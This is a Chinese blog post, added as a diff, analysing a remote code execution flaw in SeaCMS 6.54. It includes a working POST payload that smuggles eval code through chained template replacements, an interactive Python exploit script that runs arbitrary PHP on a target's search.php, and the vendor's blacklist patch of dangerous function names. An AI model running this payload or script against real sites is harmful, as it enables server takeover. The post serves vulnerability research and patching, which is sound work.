@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>seacms6.54 前台getshell漏洞分析 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">seacms6.54 前台getshell漏洞分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 31, 2020&nbsp;&nbsp;21:50:44</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>seacms 6.54</li>
+<li>php 5.4.45</li>
+<li>Ubuntu 18.04 + mysql 5.7 + Apache2</li>
+</ul>
+<h3 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h3><p>这个漏洞是因为绕过了针对seacms 6.45的补丁，对<code>$order</code>参数进行了限制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$order = ($order == <span class="string">"commend"</span> || $order == <span class="string">"time"</span> || $order == <span class="string">"hit"</span>) ? $order : <span class="string">""</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/patch_645.png" alt="patch_645"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这次的攻击方式和上次已经不一样了，上次是从<code>$order</code>参数入手，但是这次的补丁官方对order参数进行了白名单过滤，这样就无法通过order参数过滤进行代码注入，但是之前的6.45版本中的分析，我们已经知道，漏洞的产生是因为parseIf()函数中的参数没有经过过滤，直接拼接后调用eval()执行导致的。先看一下新的攻击的payload：</p>
+<p><strong>PoC :</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; URL</span><br><span class="line">http:&#x2F;&#x2F;192.168.247.134&#x2F;seacms654&#x2F;upload&#x2F;search.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; POST</span><br><span class="line">searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&#125;&amp;year&#x3D;:e&#123;searchpage:area&#125;&#125;&amp;area&#x3D;v&#123;searchpage:letter&#125;&amp;letter&#x3D;al&#123;searchpage:lang&#125;&amp;yuyan&#x3D;(join&#123;searchpage:jq&#125;&amp;jq&#x3D;($_P&#123;searchpage:ver&#125;&amp;ver&#x3D;OST[9]))&amp;9[]&#x3D;ph&amp;9[]&#x3D;pinfo();</span><br></pre></td></tr></table></figure>
+
+<p>从poc我们看到攻击的参数不再是通过order注入的，而是其他的参数。虽然这些变量经过了<code>removeXSS</code>，<code>addslashes</code>函数的过滤并且每个参数仅截取前20个字符，但是这些变量还是可以通过<strong>变量覆盖</strong>的方式传入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$searchword = RemoveXSS(stripslashes($searchword));</span><br><span class="line">$searchword = addslashes(cn_substr($searchword,<span class="number">20</span>));</span><br><span class="line">$searchword = trim($searchword);</span><br><span class="line"></span><br><span class="line">$jq = RemoveXSS(stripslashes($jq));</span><br><span class="line">$jq = addslashes(cn_substr($jq,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$area = RemoveXSS(stripslashes($area));</span><br><span class="line">$area = addslashes(cn_substr($area,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$year = RemoveXSS(stripslashes($year));</span><br><span class="line">$year = addslashes(cn_substr($year,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$yuyan = RemoveXSS(stripslashes($yuyan));</span><br><span class="line">$yuyan = addslashes(cn_substr($yuyan,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$letter = RemoveXSS(stripslashes($letter));</span><br><span class="line">$letter = addslashes(cn_substr($letter,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$state = RemoveXSS(stripslashes($state));</span><br><span class="line">$state = addslashes(cn_substr($state,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$ver = RemoveXSS(stripslashes($ver));</span><br><span class="line">$ver = addslashes(cn_substr($ver,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$money = RemoveXSS(stripslashes($money));</span><br><span class="line">$money = addslashes(cn_substr($money,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$order = RemoveXSS(stripslashes($order));</span><br><span class="line">$order = addslashes(cn_substr($order,<span class="number">20</span>));</span><br></pre></td></tr></table></figure>
+
+<p>在<code>echoSearchPage()</code>函数中会对<code>jq</code>、<code>area</code>、<code>year</code>等这些参数进行替换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span>(intval($searchtype)==<span class="number">5</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$tname = !<span class="keyword">empty</span>($tid)?getTypeNameOnCache($tid):<span class="string">'全部'</span>;</span><br><span class="line">		$jq = !<span class="keyword">empty</span>($jq)?$jq:<span class="string">'全部'</span>;</span><br><span class="line">		$area = !<span class="keyword">empty</span>($area)?$area:<span class="string">'全部'</span>;</span><br><span class="line">		$year = !<span class="keyword">empty</span>($year)?$year:<span class="string">'全部'</span>;</span><br><span class="line">		$yuyan = !<span class="keyword">empty</span>($yuyan)?$yuyan:<span class="string">'全部'</span>;</span><br><span class="line">		$letter = !<span class="keyword">empty</span>($letter)?$letter:<span class="string">'全部'</span>;</span><br><span class="line">		$state = !<span class="keyword">empty</span>($state)?$state:<span class="string">'全部'</span>;</span><br><span class="line">		$ver = !<span class="keyword">empty</span>($ver)?$ver:<span class="string">'全部'</span>;</span><br><span class="line">		$money = !<span class="keyword">empty</span>($money)?$money:<span class="string">'全部'</span>;</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:type&#125;"</span>,$tid,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:typename&#125;"</span>,$tname ,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:year&#125;"</span>,$year,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:area&#125;"</span>,$area,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:letter&#125;"</span>,$letter,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:lang&#125;"</span>,$yuyan,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:jq&#125;"</span>,$jq,$content);</span><br><span class="line">		<span class="keyword">if</span>($state==<span class="string">'w'</span>)&#123;$state2=<span class="string">"完结"</span>;&#125;<span class="keyword">elseif</span>($state==<span class="string">'l'</span>)&#123;$state2=<span class="string">"连载中"</span>;&#125;<span class="keyword">else</span>&#123;$state2=<span class="string">"全部"</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span>($money==<span class="string">'m'</span>)&#123;$money2=<span class="string">"免费"</span>;&#125;<span class="keyword">elseif</span>($money==<span class="string">'s'</span>)&#123;$money2=<span class="string">"收费"</span>;&#125;<span class="keyword">else</span>&#123;$money2=<span class="string">"全部"</span>;&#125;</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:state&#125;"</span>,$state2,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:money&#125;"</span>,$money2,$content);</span><br><span class="line">		$content = str_replace(<span class="string">"&#123;searchpage:ver&#125;"</span>,$ver,$content);</span><br><span class="line">		$content=$mainClassObj-&gt;parsePageList($content,<span class="string">""</span>,$page,$pCount,$TotalResult,<span class="string">"cascade"</span>);</span><br><span class="line">		$content=$mainClassObj-&gt;parseSearchItemList($content,<span class="string">"type"</span>);</span><br><span class="line">		...</span><br><span class="line">		...</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$content=$mainClassObj-&gt;parsePageList($content,<span class="string">""</span>,$page,$pCount,$TotalResult,<span class="string">"search"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$content=replaceCurrentTypeId($content,<span class="number">-444</span>);</span><br><span class="line">	$content=$mainClassObj-&gt;parseIf($content);</span><br><span class="line">	$content=str_replace(<span class="string">"&#123;seacms:member&#125;"</span>,front_member(),$content);</span><br><span class="line">	$searchPageStr = $content;</span><br><span class="line">	<span class="keyword">echo</span> str_replace(<span class="string">"&#123;seacms:runinfo&#125;"</span>,getRunTime($t1),$searchPageStr) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从前面的分析我们已经知道<code>$content</code>的内容就是<code>templets/default/cascade.html</code>，在未替换前的内容为:</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/0.png" alt="0"></p>
+<p>此时<code>$searchword={if{searchpage:year}</code>，执行下面的替换语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br></pre></td></tr></table></figure>
+
+<p>替换后为:</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/1.png" alt="1"></p>
+<p>然后我们知道<code>$year=:e{searchpage:area}}</code>，然后执行下面的语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:year&#125;"</span>,$year,$content);</span><br></pre></td></tr></table></figure>
+
+<p>替换后为：</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/2.png" alt="2"></p>
+<p>同理，继续执行str_replace，<code>$area=v{searchpage:letter}</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:area&#125;"</span>,$area,$content);</span><br></pre></td></tr></table></figure>
+
+<p>替换后为:</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/3.png" alt="3"></p>
+<p>继续执行下面的语句替换<code>$content</code>内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:letter&#125;"</span>,$letter,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:lang&#125;"</span>,$yuyan,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:jq&#125;"</span>,$jq,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:ver&#125;"</span>,$ver,$content);</span><br></pre></td></tr></table></figure>
+
+<p>替换完的结果是</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/4.png" alt="4"></p>
+<p>总之，依次替换后的内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if&#123;searchpage:year&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if&#123;searchpage:year&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:e&#123;searchpage:area&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:e&#123;searchpage:area&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:ev&#123;searchpage:letter&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:ev&#123;searchpage:letter&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:eval&#123;searchpage:lang&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:eval&#123;searchpage:lang&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:eval(join&#123;searchpage:jq&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:eval(join&#123;searchpage:jq&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:eval(join($_P&#123;searchpage:ver&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:eval(join($_P&#123;searchpage:ver&#125;&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&#123;if:eval(join($_POST[9]))&#125;,海洋CMS&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&#123;if:eval(join($_POST[9]))&#125;,海洋CMS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>被传入<code>parseIf()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$labelRule = buildregx(<span class="string">"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;"</span>,<span class="string">"is"</span>);</span><br><span class="line">...</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br></pre></td></tr></table></figure>
+
+<p>就能解析出<code>1eval(join($_POST[9]))</code></p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/5.png" alt="5"></p>
+<p>最后执行的eval语句就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="keyword">if</span>(<span class="keyword">eval</span>(join($_POST[<span class="number">9</span>])))&#123;$ifFlag=<span class="keyword">true</span>;&#125;<span class="keyword">else</span>&#123;$ifFlag=<span class="keyword">false</span>;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/6.png" alt="6"></p>
+<h3 id="Python-脚本"><a href="#Python-脚本" class="headerlink" title="Python 脚本"></a>Python 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">'Bantian'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Usage : "</span>)</span><br><span class="line">    print(<span class="string">"         python %s [URL]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">"Example : "</span>)</span><br><span class="line">    print(<span class="string">"         python %s http://example.com/search.php"</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    print(<span class="string">"Type command 'q' for exit"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    help()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">1</span>].endswith(<span class="string">"search.php"</span>):</span><br><span class="line">        print(<span class="string">"[+] Please make sure url end with search.php"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            payload = input(<span class="string">"-&gt; "</span>)</span><br><span class="line">            <span class="keyword">if</span> payload != <span class="string">"q"</span>:</span><br><span class="line">                postdata = &#123;</span><br><span class="line">                    <span class="string">"searchtype"</span> : <span class="string">"5"</span>,</span><br><span class="line">                    <span class="string">"searchword"</span> : <span class="string">"&#123;if&#123;searchpage:year&#125;"</span>,</span><br><span class="line">                    <span class="string">"year"</span> : <span class="string">":e&#123;searchpage:area&#125;&#125;"</span>,</span><br><span class="line">                    <span class="string">"area"</span> : <span class="string">"v&#123;searchpage:letter&#125;"</span>,</span><br><span class="line">                    <span class="string">"letter"</span> : <span class="string">"al&#123;searchpage:lang&#125;"</span>,</span><br><span class="line">                    <span class="string">"yuyan"</span> : <span class="string">"(join&#123;searchpage:jq&#125;"</span>,</span><br><span class="line">                    <span class="string">"jq"</span> : <span class="string">"($_P&#123;searchpage:ver&#125;"</span>,</span><br><span class="line">                    <span class="string">"ver"</span> : <span class="string">"OST[9]))"</span>,</span><br><span class="line">                    <span class="string">"9[]"</span> : payload</span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url = sys.argv[<span class="number">1</span>], data = postdata)</span><br><span class="line">                idx = r.text.find(<span class="string">"&lt;!DOCTYPE html&gt;"</span>)</span><br><span class="line">                print(r.text[:idx])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poc()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"It only works for seacms v6.54!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/7.png" alt="7"></p>
+<h3 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h3><p><code>include/main.class.php</code>:</p>
+<p><img src="/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/patch.png" alt="patch"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($iar <span class="keyword">as</span> $v)&#123;</span><br><span class="line">            $iarok[] = str_replace(<span class="keyword">array</span>(<span class="string">'unlink'</span>,<span class="string">'opendir'</span>,<span class="string">'mysqli_'</span>,<span class="string">'mysql_'</span>,<span class="string">'socket_'</span>,<span class="string">'curl_'</span>,<span class="string">'base64_'</span>,<span class="string">'putenv'</span>,<span class="string">'popen('</span>,<span class="string">'phpinfo'</span>,<span class="string">'pfsockopen'</span>,<span class="string">'proc_'</span>,<span class="string">'preg_'</span>,<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'_SESSION'</span>,<span class="string">'eval('</span>,<span class="string">'file_'</span>,<span class="string">'passthru('</span>,<span class="string">'exec('</span>,<span class="string">'system('</span>,<span class="string">'shell_'</span>), <span class="string">'@.@'</span>, $v);</span><br><span class="line">&#125;</span><br><span class="line">$iar = $iarok;</span><br></pre></td></tr></table></figure>
+
+<p>官方给出的修复方案就是在parseIf()函数中添加黑名单，替换一些敏感字符。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://bantttian.github.io/2020/01/31/seacms6.54%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/01/seacms6.55%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">seacms6.55 前台getshell漏洞分析</a>
+            
+            
+            <a class="next" rel="next" href="/2020/01/31/seacms6.45%E5%89%8D%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">seacms6.45 前台getshell漏洞分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
